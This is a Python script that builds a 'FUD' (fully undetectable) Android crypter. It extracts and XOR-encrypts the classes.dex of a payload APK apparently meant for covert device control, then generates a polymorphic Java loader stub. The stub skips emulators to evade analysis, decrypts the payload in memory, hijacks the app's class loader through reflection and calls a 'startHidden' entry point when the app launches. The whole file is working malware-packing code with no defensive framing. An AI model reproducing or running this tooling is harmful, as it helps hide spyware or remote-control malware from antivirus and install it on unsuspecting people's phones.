import os
import random
import string
import zipfile

def random_string(length=12):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def generate_key(length=32):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def xor_encrypt(data, key):
    key_bytes = key.encode('utf-8')
    return bytearray([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])

def extract_dex(apk_path, out_dir):
    with zipfile.ZipFile(apk_path, 'r') as apk:
        apk.extract("classes.dex", out_dir)
    return os.path.join(out_dir, "classes.dex")

def build_crypter():
    payload_apk = "E:/DeviceControl/app/build/outputs/apk/user/release/app-user-release.apk"
    fud_assets = "E:/DeviceControl/app/src/fud/assets"
    fud_java = "E:/DeviceControl/app/src/fud/java/com/fud"

    print("[*] Starting Dedicated FUD Flavor Builder...")

    if not os.path.exists(payload_apk):
        print(f"[!] Error: Payload APK '{payload_apk}' not found!")
        print("[!] Please run 'gradlew assembleUserRelease' first.")
        return

    # Create target directories
    os.makedirs(fud_assets, exist_ok=True)
    os.makedirs(fud_java, exist_ok=True)

    # 1. Extract DEX from user payload
    print(f"[*] Extracting classes.dex from {payload_apk}")
    dex_path = extract_dex(payload_apk, fud_assets)

    with open(dex_path, 'rb') as f:
        dex_data = f.read()

    # 2. Encrypt DEX
    enc_key = generate_key()
    print(f"[*] Encrypting Payload with rolling key: {enc_key}")
    encrypted_data = xor_encrypt(dex_data, enc_key)

    asset_name = "sys_data_" + random_string(6) + ".dat"
    asset_path = os.path.join(fud_assets, asset_name)

    # Clean old assets in fud flavor
    for f in os.listdir(fud_assets):
        if f.endswith(".dat") or f == "classes.dex":
            try: os.remove(os.path.join(fud_assets, f))
            except: pass

    with open(asset_path, 'wb') as f:
        f.write(encrypted_data)

    print(f"[+] Encrypted payload saved directly to FUD flavor assets: {asset_path}")

    # 3. Generate Polymorphic Stub inside fud flavor
    stub_class = "FudLoader" + random_string(6).capitalize()
    method_name = "execute" + random_string(6).capitalize()

    stub_code = f"""package com.fud;

import android.content.Context;
import android.os.Build;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import dalvik.system.DexClassLoader;
import dalvik.system.InMemoryDexClassLoader;
import java.nio.ByteBuffer;

public class {stub_class} {{

    private static final byte[] K = "{enc_key}".getBytes();

    public static boolean isSafe() {{
        return !(Build.FINGERPRINT.startsWith("generic") || Build.MODEL.contains("Emulator")
                || Build.MANUFACTURER.contains("Genymotion") || "google_sdk".equals(Build.PRODUCT));
    }}

    private static volatile boolean sLoaded = false;

    public static synchronized void ensureLoaded(Context ctx) {{
        if (sLoaded) return;
        try {{
            InputStream is = ctx.getAssets().open("{asset_name}");
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int r;
            while ((r = is.read(buf)) != -1) baos.write(buf, 0, r);
            is.close();
            byte[] enc = baos.toByteArray();

            byte[] dec = new byte[enc.length];
            for (int i = 0; i < enc.length; i++) dec[i] = (byte) (enc[i] ^ K[i % K.length]);

            ClassLoader appCl = ctx.getClassLoader();
            ClassLoader bootCl = appCl.getParent();

            ClassLoader payloadCl;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
                ByteBuffer buffer = ByteBuffer.wrap(dec);
                payloadCl = new InMemoryDexClassLoader(buffer, bootCl);
            }} else {{
                File hid = new File(ctx.getFilesDir(), ".sys_cache");
                if (!hid.exists()) hid.mkdir();
                File dex = new File(hid, "core.dex");
                FileOutputStream fos = new FileOutputStream(dex);
                fos.write(dec); fos.flush(); fos.close();
                File opt = ctx.getDir("dex_opt", Context.MODE_PRIVATE);
                payloadCl = new DexClassLoader(dex.getAbsolutePath(), opt.getAbsolutePath(), null, bootCl);
                dex.delete();
            }}

            java.lang.reflect.Field parentField = ClassLoader.class.getDeclaredField("parent");
            parentField.setAccessible(true);
            parentField.set(appCl, payloadCl);

            sLoaded = true;
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}

    public static void {method_name}(Context ctx) {{
        if (!isSafe()) return;
        ensureLoaded(ctx);
        try {{
            Class<?> pClass = ctx.getClassLoader().loadClass("com.device.ctrl.MainActivity");
            Method m = pClass.getMethod("startHidden", Context.class);
            m.invoke(null, ctx);
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
}}
"""
    # Clean old stub java files in fud flavor
    for f in os.listdir(fud_java):
        if f.startswith("FudLoader") and f.endswith(".java"):
            try: os.remove(os.path.join(fud_java, f))
            except: pass

    stub_path = os.path.join(fud_java, f"{stub_class}.java")
    with open(stub_path, 'w') as f:
        f.write(stub_code)

    # 4. Generate FudApp.java inside fud flavor
    app_code = f"""package com.fud;

import android.app.Application;
import android.content.Context;

public class FudApp extends Application {{
    @Override
    protected void attachBaseContext(Context base) {{
        super.attachBaseContext(base);
        {stub_class}.ensureLoaded(base);
    }}
}}
"""
    with open(os.path.join(fud_java, "FudApp.java"), 'w') as f:
        f.write(app_code)

    # 5. Generate FudActivity.java inside fud flavor
    activity_code = f"""package com.fud;

import android.app.Activity;
import android.os.Bundle;

public class FudActivity extends Activity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);

        // Execute Fileless Memory Injection
        {stub_class}.{method_name}(this);

        finish();
    }}
}}
"""
    with open(os.path.join(fud_java, "FudActivity.java"), 'w') as f:
        f.write(activity_code)

    print(f"\n[+] DEDICATED FUD FLAVOR CONSTRUCTED!")
    print(f"    - Assets Payload : {asset_path}")
    print(f"    - Polymorphic Stub : {stub_path}")
    print(f"    - Launcher Activity : com.fud.FudActivity")
    print(f"\n[*] Now run: 'gradlew assembleFudRelease' to build your dedicated FUD APK!")

if __name__ == "__main__":
    build_crypter()
